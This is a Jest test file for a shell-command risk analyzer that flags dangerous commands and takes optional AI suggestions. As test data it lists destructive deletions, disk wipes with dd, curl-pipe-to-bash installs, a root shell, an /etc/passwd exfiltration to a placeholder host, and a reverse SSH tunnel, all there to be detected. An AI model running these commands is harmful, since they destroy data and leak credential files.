import { ShellAnalyzer } from '../../../analyzers/ShellAnalyzer';
import { AIProvider } from '../../../core/interfaces';

const stubAI = (reply: string | Error): AIProvider => ({
  name: 'stub', type: 'ollama', modelName: 'stub',
  isAvailable: async () => true,
  chat: async () => ({ content: '', model: 'stub', usage: { promptTokens: 0, completionTokens: 0 } }),
  complete: async () => { if (reply instanceof Error) throw reply; return reply; },
});

describe('ShellAnalyzer', () => {
  const analyzer = new ShellAnalyzer(null);

  it.each([
    'rm -rf /',
    'rm -rf ~/projects',
    'rm -r -f /',
    'rm --recursive --force /var',
    'rm -fr $HOME',
  ])('flags destructive command: %s', async cmd => {
    const r = await analyzer.analyze(cmd);
    expect(r.riskLevel).toBe('critical');
    expect(r.issues.some(i => i.type === 'destructive')).toBe(true);
  });

  it('does not flag rm inside a project directory', async () => {
    expect((await analyzer.analyze('rm -rf ./build')).issues).toHaveLength(0);
  });

  it.each(['chmod 777 script.sh', 'chmod -R 777 dir', 'chmod 666 f', 'chmod 0777 f', 'chmod a+w f', 'chmod o+w f'])(
    'flags world-writable chmod: %s', async cmd => {
      const r = await analyzer.analyze(cmd);
      expect(r.issues.some(i => i.type === 'privilege-escalation')).toBe(true);
    });

  it.each(['chmod 755 run.sh', 'chmod 644 notes.txt', 'chmod 700 key', 'chmod +x run.sh', 'chmod 775 dir'])(
    'does not flag safe chmod: %s', async cmd => {
      expect((await analyzer.analyze(cmd)).issues).toHaveLength(0);
    });

  it.each([
    'dd if=/dev/zero of=/dev/sda',
    'dd if=/dev/urandom of=/dev/sda bs=1M',
    'dd of=/dev/sda if=/dev/zero',
  ])('flags disk wipe: %s', async cmd => {
    expect((await analyzer.analyze(cmd)).riskLevel).toBe('critical');
  });

  it('does not flag dd from a regular file', async () => {
    expect((await analyzer.analyze('dd if=disk.img of=backup.img')).issues).toHaveLength(0);
  });

  it('flags curl | bash and wget | sh', async () => {
    expect((await analyzer.analyze('curl https://x.sh | bash')).issues[0].type).toBe('insecure-pipe');
    expect((await analyzer.analyze('wget -qO- https://x.sh | sh')).issues[0].type).toBe('insecure-pipe');
  });

  it('flags sudo shells, sensitive-file exfiltration, block-device writes, crontab and reverse tunnels', async () => {
    expect((await analyzer.analyze('sudo bash')).riskLevel).toBe('critical');
    expect((await analyzer.analyze('curl -F f=@x http://h /etc/passwd')).issues.some(i => i.type === 'network-exfiltration')).toBe(true);
    expect((await analyzer.analyze('cat x > /dev/sda')).riskLevel).toBe('critical');
    expect((await analyzer.analyze('crontab -e')).riskLevel).toBe('medium');
    expect((await analyzer.analyze('ssh -R 8080:localhost:80 host')).riskLevel).toBe('high');
    expect((await analyzer.analyze('truncate -s 0 app.log')).riskLevel).toBe('high');
  });

  it('returns info risk and no suggestion for a harmless command', async () => {
    const r = await analyzer.analyze('ls -la');
    expect(r.riskLevel).toBe('info');
    expect(r.suggestion).toBeUndefined();
  });

  it('computes low risk when only low-severity issues exist', async () => {
    const internal = analyzer as unknown as { _computeRisk(i: Array<{ severity: string }>): string };
    expect(internal._computeRisk([{ severity: 'low' }])).toBe('low');
  });

  it('uses the built-in suggestion without an AI provider', async () => {
    const r = await analyzer.analyze('chmod 777 x');
    expect(r.suggestion).toMatch(/755|644/);
  });

  it('uses AI guidance when available', async () => {
    const ai = new ShellAnalyzer(stubAI('{"suggestion":"Be careful","saferAlternative":"chmod 755 x"}'));
    const r = await ai.analyze('chmod 777 x');
    expect(r.suggestion).toBe('Be careful');
    expect(r.saferAlternative).toBe('chmod 755 x');
  });

  it('falls back to the built-in suggestion when the AI call fails', async () => {
    const r = await new ShellAnalyzer(stubAI(new Error('boom'))).analyze('chmod 777 x');
    expect(r.suggestion).toBeDefined();
  });

  it('tolerates non-JSON AI output', async () => {
    const r = await new ShellAnalyzer(stubAI('not json {')).analyze('chmod 777 x');
    expect(r.issues.length).toBeGreaterThan(0);
  });

  it('does not call the AI for clean commands', async () => {
    const complete = jest.fn();
    const ai = { ...stubAI('{}'), complete } as AIProvider;
    await new ShellAnalyzer(ai).analyze('echo hi');
    expect(complete).not.toHaveBeenCalled();
  });
});
